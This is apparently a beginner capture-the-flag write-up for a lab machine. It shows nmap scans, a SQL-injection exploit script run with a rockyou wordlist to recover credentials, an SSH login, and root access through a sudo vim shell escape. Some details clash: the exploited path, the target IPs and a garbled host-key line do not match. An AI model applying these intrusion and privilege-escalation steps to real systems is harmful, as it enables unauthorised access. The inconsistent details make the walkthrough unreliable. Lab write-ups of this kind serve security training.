## Objetivo
Beginner level ctf
## Solución 
root@ip-10-10-218-49:~# nmap 10.10.243.244

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-20 00:10 BST
Nmap scan report for ip-10-10-243-244.eu-west-1.compute.internal (10.10.243.244)
Host is up (0.00048s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
MAC Address: 02:F0:BB:BC:F1:4D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 15.80 seconds

root@ip-10-10-218-49:~# nmap -sC -sV 10.10.243.244

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-20 00:13 BST
Nmap scan report for ip-10-10-243-244.eu-west-1.compute.internal (10.10.243.244)
Host is up (0.00045s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.218.49
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:F0:BB:BC:F1:4D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.05 seconds

root@ip-10-10-218-49:~# nmap -sC -sV 10.10.243.244

Starting Nmap 7.60 ( https://nmap.org ) at 2024-10-20 00:13 BST
Nmap scan report for ip-10-10-243-244.eu-west-1.compute.internal (10.10.243.244)
Host is up (0.00045s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.218.49
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:F0:BB:BC:F1:4D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.05 seconds


root@ip-10-10-218-49:~# python3 4663.py -u http://10.10.243.244/simple/crack -w /usr/rockyou.txt
[+] Salt for password found: 1dac0d92e9fa6bb2 
[+] Username found mitch
[+] Email found: admin@admin.com
[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$ asks
[*] Now try to crack password

root@ip-10-10-218-49:~# ssh mitch@10.10.220.25 -p 2222
The authenticity of host '10.10.243.244 :2222 (10.10.243.244:2222)' can't be established. ECDSA key fingerprint is SHA256: Fce5J4GBLgx1+iaSMBjO+NFK0jZVL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[110.10.243.244 :2222' (ECDSA) to the list of known hosts.
mitch@10.10.220.25's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
$
$
$
$
$
$ whoami mitch
$ pwd /home/mitch $ ls
user.txt
$
$
$
$ cat user.txt
G00d j0b, keep up!
$
$
$
$ sudo -l
User mitch may run the following commands on Machine: (root) NOPASSWD: /usr/bin/vim
How many ser
$
$
$ sudo vim -c ':!/bin/sh'
#whoami
root
# pwd
/home/mitch
# 
# 
#
# cd /root/ # ls
root.txt
# cat root.txt
Wзll don3. You made it!
#
## Notas
